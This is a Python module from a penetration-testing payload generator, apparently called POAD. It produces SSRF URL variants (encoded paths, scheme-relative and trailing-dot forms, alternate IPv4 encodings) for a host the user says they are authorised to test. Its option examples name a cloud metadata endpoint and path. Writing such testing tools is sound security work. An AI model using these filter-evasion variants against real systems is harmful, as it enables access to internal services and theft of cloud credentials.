"""Server-Side Request Forgery module.

Generates URL-parser and encoding variants for a host/endpoint the user is
authorised to test. POAD deliberately ships **no** default targets: it never
auto-generates cloud metadata endpoints, internal IP ranges, or external
callback services. Variants are built from the host *you* provide.

Many variants only matter for specific URL parsers; this is noted in the output.
"""

from __future__ import annotations

import ipaddress
from typing import Any

from poad.core import transformations
from poad.core.generator import Unit
from poad.modules.base import BaseModule, BuildOutput, ModuleError, Option, register

SCHEMES = ("http", "https", "gopher", "file", "dict", "ftp")


def _ipv4_variants(host: str) -> list[tuple[str, str]]:
    """Return (representation, label) alternate encodings of an IPv4 host."""
    try:
        ip = ipaddress.IPv4Address(host)
    except ipaddress.AddressValueError:
        return []
    packed = int(ip)
    out = [
        (str(packed), "decimal-int"),
        (hex(packed), "hex-int"),
        ("0" + oct(packed)[2:], "octal-int"),
    ]
    # Dotted hex form, e.g. 0x7f.0x00.0x00.0x01
    octets = str(ip).split(".")
    out.append((".".join("0x%02x" % int(o) for o in octets), "dotted-hex"))
    # Dotted octal with zero padding.
    out.append((".".join("0%o" % int(o) for o in octets), "dotted-octal"))
    return out


class SSRFModule(BaseModule):
    key = "ssrf"
    aliases = ("server-side-request-forgery",)
    title = "Server-Side Request Forgery"
    summary = "URL parser/encoding variants for an authorised host (no default targets)."

    def options(self) -> list[Option]:
        return [
            Option("host", "Authorised host or IP the server will be made to request",
                   required=True, prompt="Host or IP", example="169.254.169.254"),
            Option("scheme", "URL scheme", type="choice", choices=SCHEMES,
                   default="http", prompt="Scheme"),
            Option("path", "URL path the target will fetch", default="/",
                   prompt="Path", example="/latest/meta-data/"),
            Option("port", "Optional port", prompt="Port (optional)", example="80"),
        ]

    def build(self, ctx: dict[str, Any], library) -> BuildOutput:
        ctx = self.apply_defaults(ctx)
        self.require(ctx, "host")
        host = str(ctx["host"]).strip()
        scheme = str(ctx.get("scheme", "http")).lower()
        path = str(ctx.get("path") or "/")
        port = str(ctx.get("port") or "").strip()
        if scheme not in SCHEMES:
            raise ModuleError(f"scheme must be one of: {', '.join(SCHEMES)}")
        if not path.startswith("/"):
            path = "/" + path
        if any(c in host for c in (" ", "\n", "\r", "/")):
            raise ModuleError("host must be a bare host or IP (no scheme/slashes)")

        authority = f"{host}:{port}" if port else host
        units: list[Unit] = []

        def add(value: str, family: str, note: str | None = None) -> None:
            units.append(Unit(value=value, transforms=(), family=family,
                              template_id=f"ssrf-{family}", note=note))

        # Baseline and simple parser confusion variants.
        add(f"{scheme}://{authority}{path}", "direct")
        add(f"//{authority}{path}", "scheme-relative",
            "Scheme-relative; inherits the app's scheme in some clients.")
        add(f"{scheme}://{host}.{(':' + port) if port else ''}{path}", "trailing-dot",
            "Trailing dot on host; parser-dependent.")
        add(f"{scheme}://{authority}", "no-path")

        # Encoded-path variant (only the path is percent-encoded, scheme/host intact).
        enc_path = transformations.url_all(path)
        if enc_path != path:
            add(f"{scheme}://{authority}{enc_path}", "encoded-path",
                "Path percent-encoded; host/scheme left intact.")

        # Double-URL-encoded path (filter-evasion, parser-dependent).
        dbl = transformations.url_all_double(path)
        if dbl not in (path, enc_path):
            add(f"{scheme}://{authority}{dbl}", "double-encoded-path",
                "Double-encoded path; only works if the app decodes twice.")

        # Alternate IP encodings (only when the host is an IPv4 literal the user gave).
        for rep, label in _ipv4_variants(host):
            auth = f"{rep}:{port}" if port else rep
            add(f"{scheme}://{auth}{path}", f"ipv4-{label}",
                "Alternate IPv4 encoding; depends on the target's address parser.")

        notes = [
            "POAD ships no default SSRF targets. These variants are built only from "
            "the host you supplied, which you must be authorised to test.",
            "Which variants succeed depends entirely on the target application's URL "
            "parser and allow/deny logic.",
        ]
        info = {"Category": "SSRF", "Host": host, "Scheme": scheme, "Path": path}
        if port:
            info["Port"] = port
        return BuildOutput(units=units, info=info, notes=notes)


register(SSRFModule())
